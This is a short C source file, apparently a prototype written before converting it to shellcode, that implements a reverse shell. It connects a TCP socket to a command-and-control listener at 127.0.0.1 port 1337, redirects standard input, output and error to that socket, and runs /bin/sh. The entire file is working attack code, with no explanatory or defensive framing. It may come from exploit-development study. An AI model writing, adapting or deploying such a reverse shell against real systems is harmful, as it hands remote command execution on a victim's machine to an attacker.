#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    // hear is my shellcode goes
    // Connect to C&C Server on localhost aka 127.0.0.1 and on port 1337
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in conn_addr = {0};
    conn_addr.sin_family = AF_INET;
    conn_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    conn_addr.sin_port = htons(1337);
    if(connect(sock, &conn_addr, sizeof(conn_addr)))
    {
        perror("Could not connect to the (ip, port)");
        exit(0);
    }
    // Redirect STDIN, STDOUT and STDERR to the socket
    if(dup2(sock, 0) == -1)
    {
        perror("Could not duplicate socket as stdin");
        exit(0);
    }

    if(dup2(sock, 1) == -1)
    {
        perror("Could not duplicate socket as stdout");
        exit(0);
    }

    if(dup2(sock, 2) == -1)
    {
        perror("Could not duplicate socket as stderr");
        exit(0);
    }
    // Execute /bin/sh
    execv("/bin/sh", 0);
    // here is my shellcode ends    
}
